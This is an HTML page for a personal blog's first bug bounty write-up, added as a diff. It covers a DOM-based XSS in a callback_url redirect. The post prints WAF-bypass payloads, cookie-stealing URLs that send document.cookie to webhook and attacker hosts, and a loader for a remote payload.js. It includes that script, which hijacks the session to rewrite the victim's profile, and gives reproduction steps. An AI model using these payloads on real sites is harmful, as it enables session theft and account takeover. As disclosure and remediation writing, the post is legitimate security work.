@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>First Bounty H1 - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/posts/updated-first-bounty-h1/">
+  <meta property="og:site_name" content="My Personal Blog">
+  <meta property="og:title" content="First Bounty H1">
+  <meta property="og:description" content="Welcome to my first bug bounty writeup! 🎉
+In this report, I uncover a DOM-based Cross-Site Scripting (XSS) vulnerability in the callback_url parameter of a web application, demonstrate how I bypassed a modern WAF, and show how an attacker could achieve full account compromise through session hijacking and profile manipulation.
+🧩 Vulnerability Overview Type: DOM-based XSS Parameter: callback_url in URL query Location: Client-side redirect via window.location.href WAF: Akamai WAF blocks common javascript: URIs Impact: Account takeover, data exfiltration, profile manipulation 🔍 Root Cause Analysis The application’s JavaScript code contains a critical flaw in how it handles URL parameters:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-24T10:11:07+01:00">
+    <meta property="article:modified_time" content="2025-07-24T10:11:07+01:00">
+    <meta property="article:tag" content="Xss">
+    <meta property="article:tag" content="Bug Bounty">
+    <meta property="article:tag" content="Web Security">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="First Bounty H1">
+  <meta name="twitter:description" content="Welcome to my first bug bounty writeup! 🎉
+In this report, I uncover a DOM-based Cross-Site Scripting (XSS) vulnerability in the callback_url parameter of a web application, demonstrate how I bypassed a modern WAF, and show how an attacker could achieve full account compromise through session hijacking and profile manipulation.
+🧩 Vulnerability Overview Type: DOM-based XSS Parameter: callback_url in URL query Location: Client-side redirect via window.location.href WAF: Akamai WAF blocks common javascript: URIs Impact: Account takeover, data exfiltration, profile manipulation 🔍 Root Cause Analysis The application’s JavaScript code contains a critical flaw in how it handles URL parameters:">
+<meta name="application-name" content="My Personal Blog">
+<meta name="apple-mobile-web-app-title" content="My Personal Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/updated-first-bounty-h1/" /><link rel="next" href="http://localhost:1313/posts/first-bounty-h1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "First Bounty H1",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/updated-first-bounty-h1\/"
+        },"genre": "posts","keywords": "xss, bug bounty, web security","wordcount":  724 ,
+        "url": "http:\/\/localhost:1313\/posts\/updated-first-bounty-h1\/","datePublished": "2025-07-24T10:11:07+01:00","dateModified": "2025-07-24T10:11:07+01:00","license": "2025 F0DH1L","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "F0DH1L"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My Personal Blog">F0DH1L Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My Personal Blog">F0DH1L Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">First Bounty H1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span>&nbsp;<span class="post-category">included in <a href="/categories/bug-bounty/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Bug Bounty</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-07-24">2025-07-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;724 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/first-report.png"
+        data-srcset="/images/first-report.png, /images/first-report.png 1.5x, /images/first-report.png 2x"
+        data-sizes="auto"
+        alt="/images/first-report.png"
+        title="/images/first-report.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#-vulnerability-overview">🧩 Vulnerability Overview</a></li>
+    <li><a href="#-root-cause-analysis">🔍 Root Cause Analysis</a></li>
+    <li><a href="#-waf-bypass-techniques">🚧 WAF Bypass Techniques</a>
+      <ul>
+        <li><a href="#1-optional-chaining-operator">1. Optional Chaining Operator</a></li>
+        <li><a href="#2-string-concatenation">2. String Concatenation</a></li>
+        <li><a href="#3-dynamic-script-loading">3. Dynamic Script Loading</a></li>
+      </ul>
+    </li>
+    <li><a href="#-exploitation-scenarios">🔥 Exploitation Scenarios</a>
+      <ul>
+        <li><a href="#scenario-1-cookie-exfiltration">Scenario 1: Cookie Exfiltration</a></li>
+        <li><a href="#scenario-2-account-profile-manipulation">Scenario 2: Account Profile Manipulation</a></li>
+      </ul>
+    </li>
+    <li><a href="#-network-based-waf-bypass">🌐 Network-Based WAF Bypass</a></li>
+    <li><a href="#-step-by-step-reproduction">📋 Step-by-Step Reproduction</a>
+      <ul>
+        <li><a href="#basic-xss-verification">Basic XSS Verification:</a></li>
+        <li><a href="#cookie-exfiltration">Cookie Exfiltration:</a></li>
+        <li><a href="#profile-manipulation">Profile Manipulation:</a></li>
+      </ul>
+    </li>
+    <li><a href="#-impact-assessment">💥 Impact Assessment</a></li>
+    <li><a href="#-remediation-recommendations">🛡️ Remediation Recommendations</a>
+      <ul>
+        <li><a href="#immediate-fixes">Immediate Fixes:</a></li>
+        <li><a href="#long-term-security-measures">Long-term Security Measures:</a></li>
+      </ul>
+    </li>
+    <li><a href="#-timeline--disclosure">📝 Timeline &amp; Disclosure</a></li>
+    <li><a href="#-key-takeaways">🎯 Key Takeaways</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><hr>
+<p>Welcome to my first bug bounty writeup! 🎉<br>
+In this report, I uncover a <strong>DOM-based Cross-Site Scripting (XSS)</strong> vulnerability in the <code>callback_url</code> parameter of a web application, demonstrate how I bypassed a modern WAF, and show how an attacker could achieve full account compromise through session hijacking and profile manipulation.</p>
+<hr>
+<h2 id="-vulnerability-overview">🧩 Vulnerability Overview</h2>
+<ul>
+<li><strong>Type:</strong> DOM-based XSS</li>
+<li><strong>Parameter:</strong> <code>callback_url</code> in URL query</li>
+<li><strong>Location:</strong> Client-side redirect via <code>window.location.href</code></li>
+<li><strong>WAF:</strong> Akamai WAF blocks common <code>javascript:</code> URIs</li>
+<li><strong>Impact:</strong> Account takeover, data exfiltration, profile manipulation</li>
+</ul>
+<hr>
+<h2 id="-root-cause-analysis">🔍 Root Cause Analysis</h2>
+<p>The application&rsquo;s JavaScript code contains a critical flaw in how it handles URL parameters:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">k</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">).</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;callback_url&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">k</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>The Problem:</strong></p>
+<ol>
+<li>User input from <code>callback_url</code> parameter is retrieved directly from <code>window.location.search</code></li>
+<li>No validation or sanitization is applied to the URI scheme</li>
+<li>The value is directly assigned to <code>window.location.href</code> without any checks</li>
+<li>This allows <code>javascript:</code> URIs to execute arbitrary code in the user&rsquo;s browser context</li>
+</ol>
+<hr>
+<h2 id="-waf-bypass-techniques">🚧 WAF Bypass Techniques</h2>
+<p>The target employs Akamai WAF which blocks common XSS payloads. However, I discovered several bypass techniques:</p>
+<h3 id="1-optional-chaining-operator">1. Optional Chaining Operator</h3>
+<p>Using the <code>?.</code> operator to evade signature detection:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">javascript</span><span class="o">:</span><span class="nx">print</span><span class="o">?</span><span class="p">.()</span></span></span></code></pre></div></div>
+<h3 id="2-string-concatenation">2. String Concatenation</h3>
+<p>Breaking up sensitive keywords to avoid pattern matching:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">javascript</span><span class="o">:</span><span class="nx">fetch</span><span class="o">?</span><span class="p">.(</span><span class="s1">&#39;https://webhook.com?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">[</span><span class="s1">&#39;co&#39;</span><span class="o">+</span><span class="s1">&#39;okie&#39;</span><span class="p">])</span></span></span></code></pre></div></div>
+<h3 id="3-dynamic-script-loading">3. Dynamic Script Loading</h3>
+<p>For complex payloads, loading external scripts:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">javascript</span><span class="o">:</span><span class="nx">d</span><span class="o">=</span><span class="nb">document</span><span class="p">;</span><span class="nx">a</span><span class="o">=</span><span class="s1">&#39;scr&#39;</span><span class="p">;</span><span class="nx">b</span><span class="o">=</span><span class="s1">&#39;ipt&#39;</span><span class="p">;</span><span class="nx">s</span><span class="o">=</span><span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="o">?</span><span class="p">.(</span><span class="nx">a</span><span class="o">%</span><span class="mi">2</span><span class="nx">Bb</span><span class="p">);</span><span class="nx">s</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;https://cdn.jsdelivr.net/gh/attacker/payload.js&#39;</span><span class="p">;</span><span class="nx">d</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="o">?</span><span class="p">.(</span><span class="nx">s</span><span class="p">)</span></span></span></code></pre></div></div>
+<hr>
+<h2 id="-exploitation-scenarios">🔥 Exploitation Scenarios</h2>
+<h3 id="scenario-1-cookie-exfiltration">Scenario 1: Cookie Exfiltration</h3>
+<p><strong>Payload:</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>https://example.com/social-ads/?callback_url=javascript:fetch?.(&#39;https://attacker.webhook.com?q=&#39;%2bdocument[&#39;co&#39;%2b&#39;okie&#39;])</code></pre></div>
+<p><strong>Result:</strong> User&rsquo;s session cookies are sent to attacker-controlled endpoint.</p>
+<h3 id="scenario-2-account-profile-manipulation">Scenario 2: Account Profile Manipulation</h3>
+<p>I developed a sophisticated payload that:</p>
+<ol>
+<li>Extracts the user&rsquo;s profile information</li>
+<li>Retrieves CSRF tokens from the current session</li>
+<li>Modifies user profile data without consent</li>
+</ol>
+<p><strong>External Script (<code>payload.js</code>):</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">getUser</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://example.com/user-settings/notification&#39;</span><span class="p">,</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">credentials</span><span class="o">:</span> <span class="s1">&#39;include&#39;</span> 
+</span></span><span class="line"><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">html</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">doc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DOMParser</span><span class="p">().</span><span class="nx">parseFromString</span><span class="p">(</span><span class="nx">html</span><span class="p">,</span> <span class="s1">&#39;text/html&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">script</span> <span class="o">=</span> <span class="p">[...</span><span class="nx">doc</span><span class="p">.</span><span class="nx">scripts</span><span class="p">].</span><span class="nx">find</span><span class="p">(</span><span class="nx">s</span> <span class="p">=&gt;</span> 
+</span></span><span class="line"><span class="cl">        <span class="nx">s</span><span class="p">.</span><span class="nx">textContent</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;window.__PRELOADED_STATE__&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">json</span> <span class="o">=</span> <span class="nx">script</span><span class="p">.</span><span class="nx">textContent</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/JSON\.parse\(&#34;(.+?)&#34;\)/</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\\&#34;/g</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">).</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/\\\\/g</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">json</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">data</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">basic_info</span><span class="p">.</span><span class="nx">profile_url</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">_</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;POC worked, but user not authenticated&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">updateProfile</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">getUser</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">csrf</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;csrf=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">body</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;edit-profile-form-submitted&#34;</span><span class="o">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">csrf_token</span><span class="o">:</span> <span class="nx">csrf</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">name</span><span class="o">:</span> <span class="s1">&#39;Account Compromised&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">city</span><span class="o">:</span> <span class="s1">&#39;10&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">bio</span><span class="o">:</span> <span class="s1">&#39;XSS POC Success&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">twitter_handle</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">language</span><span class="o">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">website_link</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mobile</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">submit</span><span class="o">:</span> <span class="s1">&#39;Save&#39;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nx">fetch</span><span class="p">(</span><span class="sb">`https://example.com/users/</span><span class="si">${</span><span class="nx">user</span><span class="si">}</span><span class="sb">/edit`</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">credentials</span><span class="o">:</span> <span class="s1">&#39;include&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span> <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">body</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span> <span class="p">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nx">text</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">).</span><span class="k">catch</span><span class="p">(</span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">updateProfile</span><span class="p">();</span></span></span></code></pre></div></div>
+<hr>
+<h2 id="-network-based-waf-bypass">🌐 Network-Based WAF Bypass</h2>
+<p><strong>Interesting Discovery:</strong> The WAF behavior was inconsistent across different networks:</p>
+<ol>
+<li><strong>Corporate/WiFi Networks:</strong> WAF actively blocked payloads</li>
+<li><strong>Mobile Networks:</strong> WAF rules were less restrictive</li>
+<li><strong>Different Geographic Locations:</strong> Varying protection levels</li>
+</ol>
+<p>This suggests the WAF implementation may have network-specific rules or geographic variations in protection policies.</p>
+<hr>
+<h2 id="-step-by-step-reproduction">📋 Step-by-Step Reproduction</h2>
+<h3 id="basic-xss-verification">Basic XSS Verification:</h3>
+<ol>
+<li>Navigate to: <code>https://example.com/social-ads/?callback_url=/x</code></li>
+<li>If blocked by WAF, switch to mobile network</li>
+<li>Test with: <code>https://example.com/social-ads/?callback_url=javascript:print?.()</code></li>
+<li>Perform any login action - the <code>print()</code> dialog will fire</li>
+</ol>
+<h3 id="cookie-exfiltration">Cookie Exfiltration:</h3>
+<ol>
+<li>Set up webhook at <code>https://app.beeceptor.com/</code></li>
+<li>Visit: <code>https://example.com/social-ads/?callback_url=javascript:fetch?.('https://your.webhook.com?q='%2bdocument['co'%2b'okie'])</code></li>
+<li>Check webhook logs for intercepted cookies</li>
+</ol>
+<h3 id="profile-manipulation">Profile Manipulation:</h3>
+<ol>
+<li>Host the payload script on a CDN</li>
+<li>Visit: <code>https://example.com/social-ads/?callback_url=javascript:d=document;a='scr';b='ipt';s=d.createElement?.(a%2Bb);s.src='https://cdn.jsdelivr.net/gh/youruser/payload.js';d.body.appendChild?.(s)</code></li>
+<li>User&rsquo;s profile will be automatically modified</li>
+</ol>
+<hr>
+<h2 id="-impact-assessment">💥 Impact Assessment</h2>
+<p><strong>Severity:</strong> Critical</p>
+<p><strong>Attack Scenarios:</strong></p>
+<ul>
+<li><strong>Session Hijacking:</strong> Steal authentication cookies/tokens</li>
+<li><strong>Account Takeover:</strong> Modify user profiles, settings, and personal information</li>
+<li><strong>Data Exfiltration:</strong> Access sensitive user data through authenticated requests</li>
+<li><strong>Malicious Actions:</strong> Perform actions on behalf of the user</li>
+<li><strong>Phishing:</strong> Redirect users to malicious domains after data theft</li>
+</ul>
+<p><strong>Business Impact:</strong></p>
+<ul>
+<li>User privacy violations</li>
+<li>Potential regulatory compliance issues</li>
+<li>Reputation damage</li>
+<li>Mass account compromise potential</li>
+</ul>
+<hr>
+<h2 id="-remediation-recommendations">🛡️ Remediation Recommendations</h2>
+<h3 id="immediate-fixes">Immediate Fixes:</h3>
+<ol>
+<li>
+<p><strong>Input Validation:</strong> Implement strict URI scheme validation</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">allowedSchemes</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;http:&#39;</span><span class="p">,</span> <span class="s1">&#39;https:&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">callback_url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">allowedSchemes</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">protocol</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Reject the request
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre></div></div>
+</li>
+<li>
+<p><strong>Domain Whitelist:</strong> Only allow redirects to trusted domains</p>
+</li>
+<li>
+<p><strong>CSP Headers:</strong> Implement strict Content Security Policy</p>
+</li>
+</ol>
+<h3 id="long-term-security-measures">Long-term Security Measures:</h3>
+<ol>
+<li><strong>Security Code Review:</strong> Audit all client-side redirect implementations</li>
+<li><strong>WAF Rule Enhancement:</strong> Improve detection of obfuscated payloads</li>
+<li><strong>Input Sanitization:</strong> Sanitize all user-controlled data before use</li>
+<li><strong>Regular Security Testing:</strong> Implement automated security scanning</li>
+</ol>
+<hr>
+<h2 id="-timeline--disclosure">📝 Timeline &amp; Disclosure</h2>
+<ul>
+<li><strong>Discovery Date:</strong> [Date]</li>
+<li><strong>Initial Report:</strong> [Date]</li>
+<li><strong>Vendor Response:</strong> [Date]</li>
+<li><strong>Fix Deployed:</strong> [Date]</li>
+<li><strong>Public Disclosure:</strong> [Date]</li>
+</ul>
+<hr>
+<h2 id="-key-takeaways">🎯 Key Takeaways</h2>
+<ol>
+<li><strong>WAF Evasion:</strong> Modern WAFs can be bypassed with creative obfuscation</li>
+<li><strong>Network Variations:</strong> Security controls may behave differently across networks</li>
+<li><strong>DOM-based XSS:</strong> Client-side vulnerabilities can be just as dangerous as server-side</li>
+<li><strong>Defense in Depth:</strong> Multiple security layers are essential</li>
+<li><strong>Input Validation:</strong> Never trust user input, even in client-side code</li>
+</ol>
+<p>Thanks for reading! This was an exciting first bounty that highlighted the importance of secure coding practices and thorough security testing.</p>
